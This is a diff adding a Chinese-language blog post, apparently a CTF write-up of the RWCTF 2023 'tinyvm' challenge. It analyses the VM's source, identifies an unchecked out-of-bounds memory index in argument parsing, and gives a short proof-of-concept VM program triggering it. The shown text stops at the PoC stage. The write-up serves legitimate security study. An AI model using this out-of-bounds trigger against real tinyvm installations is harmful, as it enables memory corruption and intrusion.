@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="nich0las" />
+
+
+
+<meta name="description" content="RWCTF2023的一个签到的vm题目，漏洞不难，但是利用起来很有意思。最后没有独自做出来，参考了ctftime的writeup，也是学到了不少东西">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rwctf-tinyvm">
+<meta property="og:url" content="https://nicholas-wei.github.io/2023/01/20/rwctf-tinyvm/index.html">
+<meta property="og:site_name" content="welc0me">
+<meta property="og:description" content="RWCTF2023的一个签到的vm题目，漏洞不难，但是利用起来很有意思。最后没有独自做出来，参考了ctftime的writeup，也是学到了不少东西">
+<meta property="og:locale">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20230119184038116.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20230119150350085.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20230119185322145.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20230119185333825.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20230119185736628.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20230119185836740.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20230119185901319.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20230119195404058.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20230119204820469.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20230119212239825.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20230120125954340.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20230120154910423.png">
+<meta property="article:published_time" content="2023-01-20T08:00:56.000Z">
+<meta property="article:modified_time" content="2023-01-20T08:02:00.000Z">
+<meta property="article:author" content="nich0las">
+<meta property="article:tag" content="VM">
+<meta property="article:tag" content="exit_hook">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://nicholas-wei.github.io/.io//image-20230119184038116.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="welc0me" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>rwctf-tinyvm | welc0me</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FSOP/" rel="tag">FSOP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VM/" rel="tag">VM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bash-jail/" rel="tag">bash_jail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/botnet/" rel="tag">botnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/directed-fuzz/" rel="tag">directed_fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dp/" rel="tag">dp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exit-hook/" rel="tag">exit_hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fb-bot/" rel="tag">fb-bot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fmtstr/" rel="tag">fmtstr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzzing101/" rel="tag">fuzzing101</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/graph/" rel="tag">graph</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hardware/" rel="tag">hardware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ics-pa/" rel="tag">ics-pa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/int-overflow/" rel="tag">int_overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/interpreter/" rel="tag">interpreter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/llvm/" rel="tag">llvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/matlab/" rel="tag">matlab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/maze/" rel="tag">maze</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meltdown/" rel="tag">meltdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw/" rel="tag">pwnable.tw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/race-condition/" rel="tag">race_condition</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ransomeware/" rel="tag">ransomeware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/software-security/" rel="tag">software-security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcp/" rel="tag">tcp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tree/" rel="tag">tree</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wasm/" rel="tag">wasm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wechat/" rel="tag">wechat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">勤能补拙是良训</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-rwctf-tinyvm" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/01/20/rwctf-tinyvm/" class="article-date">
+      <time datetime="2023-01-20T08:00:56.000Z" itemprop="datePublished">2023-01-20</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      rwctf-tinyvm
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/VM/" rel="tag">VM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/exit-hook/" rel="tag">exit_hook</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>RWCTF2023的一个签到的vm题目，漏洞不难，但是利用起来很有意思。最后没有独自做出来，参考了ctftime的writeup，也是学到了不少东西</p>
+<span id="more"></span>
+
+<h1 id="rwctf-tinyvm"><a href="#rwctf-tinyvm" class="headerlink" title="rwctf-tinyvm"></a>rwctf-tinyvm</h1><p>来自rwctf-5th的一道PWN题，是最经典的<code>clone-pwn</code>，比赛结束时分值为180分。网址即为<a target="_blank" rel="noopener" href="https://github.com/jakogut/tinyvm">tinyvm</a>的最后一次commit。直接给了源码，按照有DEBUG模式下的makefile编译即可。</p>
+<p>使用makefile的编译选项，得到的结果竟然是没有canary的？这里没办法复现比赛环境，不知道是否也是如此</p>
+<p><img src="/.io//image-20230119184038116.png" alt="image-20230119184038116"></p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>在<code>tvmi.c</code>中，是整个vm的main函数。我们直接根据例子所给的<code>prime.vm</code>调试分析一下这个vm。</p>
+<p>首先vm用calloc分配了一些空间，最大的<code>mem_space</code>为0x4000000字节。这段空间将被mmap在堆和libc之间的空间中。</p>
+<p><img src="/.io//image-20230119150350085.png" alt="image-20230119150350085"></p>
+<h3 id="stack初始化"><a href="#stack初始化" class="headerlink" title="stack初始化"></a>stack初始化</h3><p>设置<code>mem-&gt;register[0x7]</code>，应该是模拟出的栈指针指向之前分配出来的memory加上0x200000byte，之后赋值<code>mem-&gt;register[0x6]</code>也是这个内容。查看文档中对于register的说明。这两个寄存器应该分别是rsp和rbp寄存器。</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">//////////////////////////////////////////////////</span><br><span class="line">// 1. REGISTERS //////////////////////////////////</span><br><span class="line">//////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">TVM has 17 registers, modeled after x86 registers.</span><br><span class="line">Register names are written lower-case.</span><br><span class="line"></span><br><span class="line">(EAX - EDX, General Purpose)</span><br><span class="line">EAX</span><br><span class="line">EBX</span><br><span class="line">ECX</span><br><span class="line">EDX</span><br><span class="line"></span><br><span class="line">ESI</span><br><span class="line">EDI</span><br><span class="line"></span><br><span class="line">ESP - Stack pointer, points to the top of the stack</span><br><span class="line">EBP - Base pointer, points to the base of the stack</span><br><span class="line"></span><br><span class="line">EIP - Instruction pointer, this is modified with the jump commands, never directly</span><br><span class="line"></span><br><span class="line">R08 - R15, General Purpose</span><br><span class="line"></span><br><span class="line">const char *tvm_register_map[] = &#123;</span><br><span class="line">	&quot;eax&quot;, &quot;ebx&quot;, &quot;ecx&quot;, &quot;edx&quot;,</span><br><span class="line">	&quot;esi&quot;, &quot;edi&quot;, &quot;esp&quot;, &quot;ebp&quot;,</span><br><span class="line">	&quot;eip&quot;,</span><br><span class="line">	&quot;r08&quot;, &quot;r09&quot;, &quot;r10&quot;, &quot;r11&quot;,</span><br><span class="line">	&quot;r12&quot;, &quot;r13&quot;, &quot;r14&quot;, &quot;r15&quot;, 0&#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="对于输入的解释"><a href="#对于输入的解释" class="headerlink" title="对于输入的解释"></a>对于输入的解释</h3><p>对于输入文件的interpret在<code>tvm_vm_interpret</code>中。通过直接读取文件，将文件内容存入本地并传递给<code>tvm_preprocess</code>的方法。</p>
+<p>在预处理阶段，程序会解析<code>include</code>部分(去寻找一个新的.vm文件，并把内容直接copy过来)以及<code>define</code>部分)(根据define关键字找到key和value，并通过<code>tvm_htab_add_ref</code>添加到一个程序的一个类似ELF的data表中去)</p>
+<p>在<code>parse_label</code>阶段，主要是针对程序不同段之间的汇编标志(label)进行划分。并通过<code>tvm_htab_add</code>设置一个新的label。中间还会检查避免产生了重复的label。</p>
+<p>在<code>parse_program</code>阶段，依然是通过每一行遍历，找到command和argument。主要在<code>tvm_parse_program</code>中。在这里有一个转化内存的地方。可以看到应该是直接将arg设置为我们给定的数字所对应的程序一开始申请的<code>mem_space</code>数组的下标。<strong>这里可能造成内存的越界访问</strong>。但是注意，下面的<code>tvm_parse_value</code>最终会调用<code>strtoul</code>，也就是最终的数字还是无符号数。回顾一下之前这段memory所在的地址空间，我们应该是不能直接修改GOT表的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tvm_parse_args()</span></span><br><span class="line"><span class="comment">/* Check to see whether the token specifies an address */</span></span><br><span class="line">		<span class="keyword">if</span> (instr_tokens[*instr_place+<span class="number">1</span> + i][<span class="number">0</span>] == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">			<span class="type">char</span> *end_symbol = <span class="built_in">strchr</span>(</span><br><span class="line">				instr_tokens[*instr_place+<span class="number">1</span> + i], <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (end_symbol) &#123;</span><br><span class="line">				*end_symbol = <span class="number">0</span>;</span><br><span class="line">				args[i] = &amp;((<span class="type">int</span> *)vm-&gt;mem-&gt;mem_space)[</span><br><span class="line">					tvm_parse_value(instr_tokens[</span><br><span class="line">						*instr_place+<span class="number">1</span> + i] + <span class="number">1</span>)];</span><br><span class="line"></span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>除此以外，<code>parse_program</code>还会找到语句中的label以及判断是否是寄存器，以及是否为立即数。</p>
+<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>运行vm在<code>tvm_vm_run</code>中。基本就是对vm里面每个指令做解释。这个和pa里面的非常类似了。甚至pa里面的还要更复杂一些，还牵涉到对于不同指令集的翻译。这里就是简单的对汇编进行匹配即可。其实这张表对于理解x86汇编也很有用，复制一份。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">tvm_step</span><span class="params">(<span class="keyword">struct</span> tvm_ctx *vm, <span class="type">int</span> *instr_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> **args = vm-&gt;prog-&gt;args[*instr_idx];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (vm-&gt;prog-&gt;instr[*instr_idx]) &#123;</span><br><span class="line"><span class="comment">/* nop   */</span>	<span class="keyword">case</span> <span class="number">0x0</span>:  <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* int   */</span>	<span class="keyword">case</span> <span class="number">0x1</span>:  <span class="comment">/* unimplemented */</span> <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* mov   */</span>	<span class="keyword">case</span> <span class="number">0x2</span>:  *args[<span class="number">0</span>] = *args[<span class="number">1</span>]; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* push  */</span>	<span class="keyword">case</span> <span class="number">0x3</span>:  tvm_stack_push(vm-&gt;mem, args[<span class="number">0</span>]); <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* pop   */</span>	<span class="keyword">case</span> <span class="number">0x4</span>:  tvm_stack_pop(vm-&gt;mem, args[<span class="number">0</span>]); <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* pushf */</span>	<span class="keyword">case</span> <span class="number">0x5</span>:  tvm_stack_push(vm-&gt;mem, &amp;vm-&gt;mem-&gt;FLAGS); <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* popf  */</span>	<span class="keyword">case</span> <span class="number">0x6</span>:  tvm_stack_pop(vm-&gt;mem, args[<span class="number">0</span>]); <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* inc   */</span>	<span class="keyword">case</span> <span class="number">0x7</span>:  ++(*args[<span class="number">0</span>]); <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* dec   */</span>	<span class="keyword">case</span> <span class="number">0x8</span>:  --(*args[<span class="number">0</span>]); <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* add   */</span>	<span class="keyword">case</span> <span class="number">0x9</span>:  *args[<span class="number">0</span>] += *args[<span class="number">1</span>]; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* sub   */</span>	<span class="keyword">case</span> <span class="number">0xA</span>:  *args[<span class="number">0</span>] -= *args[<span class="number">1</span>]; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* mul   */</span>	<span class="keyword">case</span> <span class="number">0xB</span>:  *args[<span class="number">0</span>] *= *args[<span class="number">1</span>]; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* div   */</span>	<span class="keyword">case</span> <span class="number">0xC</span>:  *args[<span class="number">0</span>] /= *args[<span class="number">1</span>]; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* mod   */</span>	<span class="keyword">case</span> <span class="number">0xD</span>:  vm-&gt;mem-&gt;remainder = *args[<span class="number">0</span>] % *args[<span class="number">1</span>]; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* rem   */</span>	<span class="keyword">case</span> <span class="number">0xE</span>:  *args[<span class="number">0</span>] = vm-&gt;mem-&gt;remainder; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* not   */</span>	<span class="keyword">case</span> <span class="number">0xF</span>:  *args[<span class="number">0</span>] = ~(*args[<span class="number">0</span>]); <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* xor   */</span>	<span class="keyword">case</span> <span class="number">0x10</span>:  *args[<span class="number">0</span>] ^= *args[<span class="number">1</span>];  <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* or    */</span>	<span class="keyword">case</span> <span class="number">0x11</span>: *args[<span class="number">0</span>] |= *args[<span class="number">1</span>];   <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* and   */</span>	<span class="keyword">case</span> <span class="number">0x12</span>: *args[<span class="number">0</span>] &amp;= *args[<span class="number">1</span>];   <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* shl   */</span>	<span class="keyword">case</span> <span class="number">0x13</span>: *args[<span class="number">0</span>] &lt;&lt;= *args[<span class="number">1</span>];  <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* shr   */</span>	<span class="keyword">case</span> <span class="number">0x14</span>: *args[<span class="number">0</span>] &gt;&gt;= *args[<span class="number">1</span>];  <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* cmp   */</span>	<span class="keyword">case</span> <span class="number">0x15</span>: vm-&gt;mem-&gt;FLAGS =</span><br><span class="line">				((*args[<span class="number">0</span>] == *args[<span class="number">1</span>]) | (*args[<span class="number">0</span>] &gt; *args[<span class="number">1</span>]) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* call	 */</span>	<span class="keyword">case</span> <span class="number">0x17</span>: tvm_stack_push(vm-&gt;mem, instr_idx);</span><br><span class="line"><span class="comment">/* jmp	 */</span>	<span class="keyword">case</span> <span class="number">0x16</span>: *instr_idx = *args[<span class="number">0</span>] - <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* ret   */</span>	<span class="keyword">case</span> <span class="number">0x18</span>: tvm_stack_pop(vm-&gt;mem, instr_idx);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* je    */</span>	<span class="keyword">case</span> <span class="number">0x19</span>:</span><br><span class="line">				*instr_idx = (vm-&gt;mem-&gt;FLAGS &amp; <span class="number">0x1</span>)</span><br><span class="line">					? *args[<span class="number">0</span>] - <span class="number">1</span> : *instr_idx;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* jne   */</span>	<span class="keyword">case</span> <span class="number">0x1A</span>:</span><br><span class="line">				*instr_idx = (!(vm-&gt;mem-&gt;FLAGS &amp; <span class="number">0x1</span>))</span><br><span class="line">					? *args[<span class="number">0</span>] - <span class="number">1</span> : *instr_idx;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* jg    */</span>	<span class="keyword">case</span> <span class="number">0x1B</span>:</span><br><span class="line">				*instr_idx = (vm-&gt;mem-&gt;FLAGS &amp; <span class="number">0x2</span>)</span><br><span class="line">					? *args[<span class="number">0</span>] - <span class="number">1</span> : *instr_idx;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* jge   */</span>	<span class="keyword">case</span> <span class="number">0x1C</span>:</span><br><span class="line">				*instr_idx = (vm-&gt;mem-&gt;FLAGS &amp; <span class="number">0x3</span>)</span><br><span class="line">					? *args[<span class="number">0</span>] - <span class="number">1</span> : *instr_idx;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* jl    */</span>	<span class="keyword">case</span> <span class="number">0x1D</span>:</span><br><span class="line">				*instr_idx = (!(vm-&gt;mem-&gt;FLAGS &amp; <span class="number">0x3</span>))</span><br><span class="line">					? *args[<span class="number">0</span>] - <span class="number">1</span> : *instr_idx;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* jle   */</span>	<span class="keyword">case</span> <span class="number">0x1E</span>:</span><br><span class="line">				*instr_idx = (!(vm-&gt;mem-&gt;FLAGS &amp; <span class="number">0x2</span>))</span><br><span class="line">					? *args[<span class="number">0</span>] - <span class="number">1</span> : *instr_idx;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* prn   */</span>	<span class="keyword">case</span> <span class="number">0x1F</span>: <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, *args[<span class="number">0</span>]);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里再次确认了使用指令访问内存时，没有任何的限制。同时这里还有一个挺有意思的指令<code>prn</code>可以用作输出内容。</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>我们尝试验证一下上面的内容，发现确实成功了。编写以下的poc.vm</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start:</span><br><span class="line">	mov eax, [-1]</span><br><span class="line">end:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>strtoul处理结果为无符号的-1。</p>
+<p><img src="/.io//image-20230119185322145.png" alt="image-20230119185322145"></p>
+<p><img src="/.io//image-20230119185333825.png" alt="image-20230119185333825"></p>
+<p>看一下我们对内存的修改过程。在<code>tvm_parse_value</code>之后。</p>
+<p><img src="/.io//image-20230119185736628.png" alt="image-20230119185736628"></p>
+<p>修改前，变量在rdx中。</p>
+<p><img src="/.io//image-20230119185836740.png" alt="image-20230119185836740"></p>
